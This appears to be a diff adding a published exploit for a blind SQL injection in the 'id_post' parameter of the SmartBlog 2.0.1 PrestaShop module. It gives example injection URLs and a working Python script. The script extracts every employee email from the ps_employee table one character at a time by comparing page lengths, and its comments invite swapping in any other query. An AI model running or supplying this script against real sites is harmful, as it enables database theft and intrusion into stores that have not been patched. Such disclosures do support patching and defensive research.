@@ -1,0 +1,84 @@
+# Exploit Title: SmartBlog 2.0.1 - 'id_post' Blind SQL injection
+# Date: 2020-11-05
+# Exploit Author: C0wnuts
+# Vendor Homepage: https://github.com/smartdatasoft/smartblog
+# Version: 2.0.1
+# Tested on: Linux
+
+# Description : A blind SQL injection is present in the "id_post" parameter of the "details" controller. It allows you to extract information from the database by means of successive character tests.
+
+# POC: 
+
+# -------------------------
+# http://localhost/[script_path]/index.php?fc=module&module=smartblog&id_post=<valid post number> or {SQL}&controller=details
+# -------------------------
+# Exemple:
+
+# 1. Test if the first character of the database name is "t":
+# http://localhost/index.php?fc=module&module=smartblog&id_post=1 or substring(DATABASE(),1,1)='t'&controller=details
+
+# 2. Test if the first character of the email of the first account is "a":
+# http://localhost/index.php?fc=module&module=smartblog&id_post=1 or substring((SELECT email FROM ps_employee LIMIT 1 offset 0),1,1)='a'&controller=details
+# -------------------------
+# Script PYTHON (python 3)
+
+
+import requests, string
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
+
+initialUrl  = 'https://localhost.com/index.php?fc=module&module=smartblog&id_post=4329824944'
+endOfUrl    = '&controller=details'
+# Change this to http:// if the website is not in https
+protocol    = "https://"
+offset      = 0
+endData     = 0
+end         = 0
+iteration   = 0
+charList    = string.printable
+
+# The character returned by the db when you reach the end of the extracted information. In my case that was "+" but it can be "\", or " " or whatever. /!\ Just test and hange this value according to your needs /!\
+endChar     = "+"
+# The length of the page when the SQLI failed. In my case that was 16094. If the lenght of the content of the page is higher than this value is that the character tested is the right one. /!\ Just test and hange this value according to your needs /!\.
+FailPageLen = 17000
+
+
+# Mysql is not case sensitive but if the db used by the website is cse sensitive remove the following line
+charList   = charList.replace("ABCDEFGHIJKLMNOPQRSTUVWXYZ","")
+
+while endData == 0:
+	contentInfo = ""
+	iteration   = 0
+	end = 0
+	while end == 0:
+		iteration = iteration + 1
+		for elem in charList:
+			url            = initialUrl
+			
+			#This request get email of all employee. Replace the request by whatever you want but keep in mind that the script extract information 1 character by 1 character then you need to keep '+str(offset)+' and substring(,'+str(iteration)+',1). "elem" is the character tested
+			request        = '%20or%20substring((SELECT%20email%20FROM%20ps_employee%20LIMIT%201%20offset%20'+str(offset)+'),'+str(iteration)+',1)=%27'+elem+'%27'
+			
+			url += request + endOfUrl
+			retry_strategy = Retry(
+				total = 30, 
+				backoff_factor = 0.2, 
+				method_whitelist = ["GET" "POST"]
+			)
+			adapter  = HTTPAdapter(max_retries=retry_strategy)
+			http     = requests.Session()
+			http.mount(protocol, adapter)
+			response = http.get("{}".format(url))
+
+			if len(response.content) > FailPageLen:
+				print(contentInfo)
+				if(elem == endChar):
+					end = 1
+					if contentInfo == "":
+						endData = 1
+				else:
+					contentInfo = contentInfo + elem
+					break
+		if contentInfo == "":
+			endData = 1
+	print(contentInfo)
+	offset = offset + 1
